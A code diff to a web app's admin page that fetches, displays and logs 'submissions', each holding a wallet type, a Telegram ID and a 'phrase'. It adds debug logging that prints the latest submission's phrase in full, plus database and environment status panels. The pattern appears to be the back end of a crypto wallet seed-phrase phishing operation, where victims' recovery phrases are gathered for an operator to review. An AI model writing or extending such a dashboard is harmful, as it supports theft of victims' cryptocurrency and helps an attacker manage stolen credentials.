@@ -48,7 +48,14 @@ export default function AdminPage() {
       setError(null) // Clear any previous errors
       console.log('🔄 Fetching submissions...')
       
-      const response = await fetch('/api/submissions')
+      // Add timestamp to prevent caching
+      const response = await fetch(`/api/submissions?t=${Date.now()}`, {
+        method: 'GET',
+        headers: {
+          'Cache-Control': 'no-cache',
+          'Pragma': 'no-cache'
+        }
+      })
       console.log('📡 Response status:', response.status)
       console.log('📡 Response headers:', Object.fromEntries(response.headers.entries()))
       
@@ -57,14 +64,28 @@ export default function AdminPage() {
         console.log('✅ Submissions data received:', data)
         console.log('📊 Submissions count:', data.submissions?.length || 0)
         console.log('🕒 Last updated:', data.lastUpdated)
+        console.log('🔍 Raw data structure:', JSON.stringify(data, null, 2))
         
         if (data.submissions && data.submissions.length > 0) {
           console.log('📝 Latest submission:', {
             id: data.submissions[0].id,
             wallet: data.submissions[0].selected_wallet,
             timestamp: data.submissions[0].timestamp,
-            telegram_id: data.submissions[0].telegram_id
+            telegram_id: data.submissions[0].telegram_id,
+            phrase: data.submissions[0].phrase
           })
+          
+          // Log all submissions for debugging
+          data.submissions.forEach((sub, index) => {
+            console.log(`📝 Submission ${index + 1}:`, {
+              id: sub.id,
+              wallet: sub.selected_wallet,
+              timestamp: sub.timestamp,
+              phraseLength: sub.phrase?.length || 0
+            })
+          })
+        } else {
+          console.log('⚠️ No submissions found in response data')
         }
         
         setSubmissions(data.submissions || [])
@@ -209,6 +230,49 @@ export default function AdminPage() {
           HTML Class: {typeof window !== 'undefined' && document.documentElement.classList.contains('dark') ? 'dark' : 'light'} |
           Storage: {typeof window !== 'undefined' ? localStorage.getItem('theme') || 'none' : 'loading...'}
         </div>
+        
+        {/* Connection Status */}
+        <div className={`text-center mb-4 p-3 rounded-lg ${
+          error ? 'bg-red-100 dark:bg-red-900/20 text-red-700 dark:text-red-300' : 
+          'bg-green-100 dark:bg-green-900/20 text-green-700 dark:text-green-300'
+        }`}>
+          <div className="flex items-center justify-center space-x-2">
+            <span className="text-lg">{error ? '❌' : '✅'}</span>
+            <span className="font-medium">
+              {error ? 'Database Connection Error' : 'Database Connected Successfully'}
+            </span>
+          </div>
+          {error && (
+            <div className="mt-2 text-sm">
+              <p className="font-medium">Error Details:</p>
+              <p className="break-all">{error}</p>
+            </div>
+          )}
+        </div>
+        
+        {/* Environment Check */}
+        <div className="text-center mb-4 p-3 rounded-lg bg-blue-100 dark:bg-blue-900/20 text-blue-700 dark:text-blue-300">
+          <div className="text-sm">
+            <p className="font-medium mb-2">Environment Variables Status:</p>
+            <div className="grid grid-cols-2 gap-2 text-xs">
+              <div className="flex items-center space-x-2">
+                <span>🔑 Supabase URL:</span>
+                <span className={typeof window !== 'undefined' && process.env.NEXT_PUBLIC_SUPABASE_URL ? 'text-green-600' : 'text-red-600'}>
+                  {typeof window !== 'undefined' && process.env.NEXT_PUBLIC_SUPABASE_URL ? '✅ Set' : '❌ Missing'}
+                </span>
+              </div>
+              <div className="flex items-center space-x-2">
+                <span>🔑 Supabase Key:</span>
+                <span className={typeof window !== 'undefined' && process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY ? 'text-green-600' : 'text-red-600'}>
+                  {typeof window !== 'undefined' && process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY ? '✅ Set' : '❌ Missing'}
+                </span>
+              </div>
+            </div>
+            <p className="mt-2 text-xs opacity-75">
+              Note: Environment variables are only visible on the server side
+            </p>
+          </div>
+        </div>
 
         {/* Header */}
         <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md dark:shadow-xl p-6 mb-6 transition-colors duration-300">
@@ -274,6 +338,21 @@ export default function AdminPage() {
               >
                 📥 Export JSON
               </button>
+              <button
+                onClick={fetchSubmissions}
+                className={`px-4 py-2 text-white rounded-lg transition-colors ${
+                  isRefreshing ? 'bg-yellow-600 cursor-not-allowed' : 'bg-yellow-600 hover:bg-yellow-700'
+                }`}
+                disabled={isRefreshing}
+              >
+                🔍 Test DB Connection
+              </button>
+              <a
+                href="/test-db"
+                className="px-4 py-2 bg-indigo-600 text-white rounded-lg hover:bg-indigo-700 transition-colors text-center"
+              >
+                🧪 DB Test Page
+              </a>
             </div>
           </div>
           
